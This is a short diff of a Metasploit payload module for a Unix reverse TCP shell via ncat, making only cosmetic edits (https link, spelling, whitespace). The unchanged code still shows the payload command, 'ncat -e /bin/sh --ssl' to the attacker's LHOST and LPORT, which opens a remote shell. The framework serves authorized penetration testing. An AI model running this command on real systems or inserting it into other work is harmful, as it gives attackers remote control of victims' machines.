@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -17,7 +17,7 @@ module MetasploitModule
   def initialize(info = {})
     super(merge_info(info,
       'Name'        => 'Unix Command Shell, Reverse TCP (via ncat)',
-      'Description' => 'Creates an interactive shell via ncat, utilising ssl mode',
+      'Description' => 'Creates an interactive shell via ncat, utilizing ssl mode',
       'Author'      => 'C_Sto',
       'License'     => MSF_LICENSE,
       'Platform'    => 'unix',
@@ -47,5 +47,4 @@ module MetasploitModule
   def command_string
     "ncat -e /bin/sh --ssl #{datastore['LHOST']} #{datastore['LPORT']}"
   end
-
 end
